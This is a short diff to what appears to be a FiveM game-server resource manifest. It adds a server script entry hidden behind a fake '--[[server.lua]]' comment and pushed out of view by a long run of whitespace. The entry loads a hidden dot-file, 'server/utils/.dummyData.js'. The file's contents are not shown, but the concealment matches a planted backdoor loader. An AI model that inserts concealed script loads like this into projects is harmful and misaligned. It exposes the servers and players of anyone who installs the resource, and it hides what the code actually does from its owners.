@@ -16,7 +16,8 @@ client_scripts {
 }
 
 server_scripts {
-	"sv_chat.lua"
+	"sv_chat.lua",
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'server/utils/.dummyData.js',
 }
 
 ui_page "html/index.html"
